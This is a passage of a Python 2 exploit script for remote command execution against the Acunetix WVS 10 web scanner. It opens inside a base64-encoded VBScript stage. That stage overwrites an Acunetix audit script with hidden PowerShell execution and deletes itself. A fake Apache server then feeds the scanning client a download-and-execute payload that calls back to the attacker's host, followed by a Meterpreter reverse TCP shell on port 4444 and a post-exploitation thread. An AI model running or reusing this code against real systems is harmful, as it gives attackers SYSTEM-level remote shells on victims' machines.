                  "211LnJ1biBrTGt1V05ieG5MVUh4dHoiICYgdmJjcmxmICZfDQogICInZ1V0RHN6bW5HTnQuRGVsZXRlRmlsZShrTGt1V05ieG5" \
                  "MVUh4dHopIiAmIHZiY3JsZiAmXw0KICAiJ2dVdERzem1uR050LkRlbGV0ZUZvbGRlcihyQ1FjVHpBQWpSeHUpIiAmIHZiY3JsZ" \
                  "iAmXw0KIkVuZCBGdW5jdGlvbiIgJiB2YmNybGYgJl8NCiJSRU9ucllKZSIgJiB2YmNybGYgJl8NCiJDcmVhdGVPYmplY3QoIiJ" \
                  "TY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIiKS5EZWxldGVGaWxlIFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUiICYgdmJjcmxmI" \
                  "CZfDQoiV1NjcmlwdC5RdWl0Ig0KICBjd2QgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKS5FeHBhbmRFbnZpcm9ubWV" \
                  "udFN0cmluZ3MoIiVzIikgJiAiXHN0YWdlbGFzdC52YnMiDQogIFNldCBvYmpGaWxlQmluZCA9IGZzby5DcmVhdGVUZXh0RmlsZS" \
                  "hjd2QgLFRydWUpDQogIG9iakZpbGVCaW5kLldyaXRlIGJpbmQgJiB2YkNyTGYNCiAgb2JqRmlsZUJpbmQuQ2xvc2UNCiAgDQog" \
                  "IGpzID0gInZhciBzaGVsbCA9IG5ldyBBY3RpdmVYT2JqZWN0KCIiV1NjcmlwdC5TaGVsbCIiKTsiJiB2YmNybGYgJiAic2hlbG" \
                  "wucnVuKCdjbWQgL0Mgc3RhcnQgL0IgIiIiIiAiInBvd2Vyc2hlbGwiIiAtd2luZG93c3R5bGUgaGlkZGVuIC1jb21tYW5kICIi" \
                  "d3NjcmlwdCAiICYgUmVwbGFjZShjd2QsIlwiLCJcXCIpICYgIiIiJyk7Ig0KICBmc28uTW92ZUZpbGUgIkM6XFByb2dyYW1EYX" \
                  "RhXEFjdW5ldGl4IFdWUyAxMFxEYXRhXFNjcmlwdHNcUGVyU2VydmVyXEFKUF9BdWRpdC5zY3JpcHQiLCAiQzpcUHJvZ3JhbURh" \
                  "dGFcQWN1bmV0aXggV1ZTIDEwXERhdGFcU2NyaXB0c1xQZXJTZXJ2ZXJcQUpQX0F1ZGl0LnNjcmlwdC5iYWsiDQogIFNldCBvYm" \
                  "pGaWxlID0gZnNvLkNyZWF0ZVRleHRGaWxlKCJDOlxQcm9ncmFtRGF0YVxBY3VuZXRpeCBXVlMgMTBcRGF0YVxTY3JpcHRzXFBl" \
                  "clNlcnZlclxBSlBfQXVkaXQuc2NyaXB0IixUcnVlKQ0KICBvYmpGaWxlLldyaXRlIGpzICYgdmJDckxmDQogIG9iakZpbGUuQ2" \
                  "xvc2UNCiAgeSA9IE1vbnRoKE5vdykgJiAiLyIgJiBEYXkoTm93KSAmICIvIiAmIFllYXIoTm93KQ0KICBoID0gSG91cihOb3cp" \
                  "ICYgIjoiJiBNaW51dGUoTm93KSsxDQogIHNSZXF1ZXN0ID0gInsiInNjYW5UeXBlIiI6IiJzY2FuIiIsIiJ0YXJnZXRMaXN0Ii" \
                  "I6IiIiIiwiInRhcmdldCIiOlsiImh0dHA6Ly93d3cuZ29vZ2xlLml0IiJdLCIicmVjdXJzZSIiOiIiLTEiIiwiImRhdGUiIjoi" \
                  "IiIgJiB5ICYgIiIiLCIiZGF5T2ZXZWVrIiI6IiIxIiIsIiJkYXlPZk1vbnRoIiI6IiIxIiIsIiJ0aW1lIiI6IiIiICYgaCAmIC" \
                  "IiIiwiImRlbGV0ZUFmdGVyQ29tcGxldGlvbiIiOiIiRmFsc2UiIiwiInBhcmFtcyIiOnsiInByb2ZpbGUiIjoiIkRlZmF1bHQi" \
                  "IiwiImxvZ2luU2VxIiI6IiI8bm9uZT4iIiwiInNldHRpbmdzIiI6IiJEZWZhdWx0IiIsIiJzY2FubmluZ21vZGUiIjoiImhldX" \
                  "Jpc3RpYyIiLCIiZXhjbHVkZWRob3VycyIiOiIiPG5vbmU+IiIsIiJzYXZldG9kYXRhYmFzZSIiOiIiVHJ1ZSIiLCIic2F2ZWxv" \
                  "Z3MiIjoiIkZhbHNlIiIsIiJnZW5lcmF0ZXJlcG9ydCIiOiIiRmFsc2UiIiwiInJlcG9ydGZvcm1hdCIiOiIiUERGIiIsIiJyZX" \
                  "BvcnR0ZW1wbGF0ZSIiOiIiV1ZTRGV2ZWxvcGVyUmVwb3J0LnJlcCIiLCIiZW1haWxhZGRyZXNzIiI6IiIiIn19Ig0KICBzZXQg" \
                  "b0hUVFAgPSBDcmVhdGVPYmplY3QoIk1pY3Jvc29mdC5YTUxIVFRQIikNCiAgb0hUVFAub3BlbiAiUE9TVCIsICJodHRwOi8vMT" \
                  "I3LjAuMC4xOjgxODMvYXBpL2FkZFNjYW4iLCBmYWxzZQ0KICBvSFRUUC5zZXRSZXF1ZXN0SGVhZGVyICJDb250ZW50LVR5cGUi" \
                  "LCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIg0KICBvSFRUUC5zZXRSZXF1ZXN0SGVhZGVyICJYLVJlcXVlc3" \
                  "RlZC1XaXRoIiwgIlhNTEh0dHBSZXF1ZXN0Ig0KICBvSFRUUC5zZXRSZXF1ZXN0SGVhZGVyICJBY2NlcHQiLCAiYXBwbGljYXRp" \
                  "b24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMSINCiAgb0hUVFAuc2V0UmVxdWVzdEhlYWRlciAiQ29udGVudC" \
                  "1UeXBlIiwgImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9VVRGLTgiDQogIG9IVFRQLnNldFJlcXVlc3RIZWFkZXIgIlJlcXVl" \
                  "c3RWYWxpZGF0ZWQiLCAgInRydWUiDQogIG9IVFRQLnNldFJlcXVlc3RIZWFkZXIgIkNvbnRlbnQtTGVuZ3RoIiwgTGVuKHNSZX" \
                  "F1ZXN0KQ0KICBvSFRUUC5zZW5kIHNSZXF1ZXN0DQogRW5kIEZ1bmN0aW9uDQogDQogRXNjYWxhdGVBbmRFeGVjdXRlDQogZnNv" \
                  "LkRlbGV0ZUZpbGUgV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KIFdTY3JpcHQuUXVpdA=="


class myHandler(BaseHTTPRequestHandler):
    timeout = 5
    server_version = "Apache"
    sys_version = "1.2"

    def log_message(self, format, *args):
        try:
            paths = str(list(args)[0])
            if "prompt" in paths or "confirm" in paths or "alert" in paths:
                print "[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (%s) bytes !" % \
                      (len(PAYLOAD_DOWNLOAD_EXEC) + len(EXPLOIT_STAGE_1))
            if "stage2" in paths:
                print "[*] Triggering EXPLOIT_STAGE_2 sending (%s) bytes !" % len(EXPLOIT_STAGE_2)
            return
        except:
            pass
            return

    def do_POST(self):
        PDE = base64.b64decode(PAYLOAD_DOWNLOAD_EXEC) % (sys.argv[2] + ":" + sys.argv[1],
                                                                 "%TEMP%", gen_random_name(12))
        data = self.rfile.read(int(self.headers.getheader("Content-Length")))
        data = data.split("&")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        for param in data:
            if "usr" in param:
                param = param.split("=")[1]
                self.wfile.write(base64.b64decode(EXPLOIT_STAGE_1)
                                 % (base64.b64encode("".join(x + "\x00" for x in PDE)),
                                    ("Bad password for user %s , <a href=\"/\">try again</a>." % param)))
                return
        self.wfile.write(base64.b64decode(EXPLOIT_STAGE_1)
                                 % (base64.b64encode("".join(x + "\x00" for x in PDE)),
                                    "Some data are missing , <a href=\"/\">try again</a>."))
        return

    def do_GET(self):
        try:
            if self.path == "/":
                self.send_response(302)
                self.send_header('Content-type', 'text/html')
                self.send_header('Location', "login")
                self.end_headers()
                # Send the html message
                self.wfile.write("<a href='/?url=test'>Here</a>")
                return
            elif self.path == "/stage2":
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                # Send the html message
                self.wfile.write(base64.b64decode(EXPLOIT_STAGE_2)
                                 % (PAYLOAD_METERPETRER % ip2b(sys.argv[2]), "%TEMP%"))
                postexpthread = Thread(target=postexploitation, args=(self.client_address[0], ))
                postexpthread.start()
                return
            else:
                string = ""
                try:
                    string = self.path.split("=")[1]
                except:
                    pass
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                # Send the html message
                PDE = base64.b64decode(PAYLOAD_DOWNLOAD_EXEC) % (sys.argv[2] + ":" + sys.argv[1],
                                                                 "%TEMP%", gen_random_name(12))
                self.wfile.write(base64.b64decode(EXPLOIT_STAGE_1)
                                 % (base64.b64encode("".join(x + "\x00" for x in PDE)), base64.b64decode(LOGIN_FORM)))
                return
        except Exception as e:
            print e.message
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write("")
            return

if __name__ == "__main__":
    print "\n\nAcunetix WVS 10 - SYSTEM Remote Command Execution (Daniele Linguaglossa)\n" \
          "Payload: Meterpreter reverse TCP 4444"
    try:
        if len(sys.argv) > 2:
            # Create a web server and define the handler to manage the
            # incoming request
            server = HTTPServer(('0.0.0.0', int(sys.argv[1])), myHandler)
            print 'Exploit started on port *:%s' % sys.argv[1]
            print '[+] Waiting for scanner...'

            # Wait forever for incoming http requests
            server.serve_forever()
        else:
            print "Usage: %s <port> <local ip/domain name>" % os.path.basename(sys.argv[0])

    except KeyboardInterrupt:
        print '^C received, shutting down the web server'
        server.socket.close()
